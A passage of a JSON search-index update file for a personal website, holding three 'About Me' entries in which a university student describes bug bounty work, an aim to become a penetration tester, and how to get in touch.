        "categories": [
          "About Me"
        ],
        "content": "What I Do I\u2019m currently a university student, and I occasionally try my hand at bug bounty work. In my work, I focus on finding new ways to protect web applications. Every project offers me the opportunity to improve, learn something new, and contribute to the progress of cybersecurity in a meaningful way. In my free time, I also enjoy reading and watching movies or TV series. ",
        "date": "03/02/2025",
        "objectID": "/about/:2:0",
        "tags": [
          "\ud83d\udc64\u200b About Me"
        ],
        "title": "\ud83d\udc64 About Me",
        "uri": "/about/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "About Me"
        ],
        "content": "My Vision I firmly believe that this world is still full of things to discover. My mission is to become an established penetration tester, contributing positively to the field of cybersecurity. ",
        "date": "03/02/2025",
        "objectID": "/about/:3:0",
        "tags": [
          "\ud83d\udc64\u200b About Me"
        ],
        "title": "\ud83d\udc64 About Me",
        "uri": "/about/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "About Me"
        ],
        "content": "Contact Me If you want to get in touch or talk about anything, feel free to reach out! You can find the links to my profiles on the homepage. I\u2019d love to hear your thoughts or discuss new opportunities! Thanks for visiting my space! ~ mH4ck3r0n3 ",
        "date": "03/02/2025",
        "objectID": "/about/:4:0",
        "tags": [
          "\ud83d\udc64\u200b About Me"
        ],
        "title": "\ud83d\udc64 About Me",
        "uri": "/about/"
      }
    }
  ]
}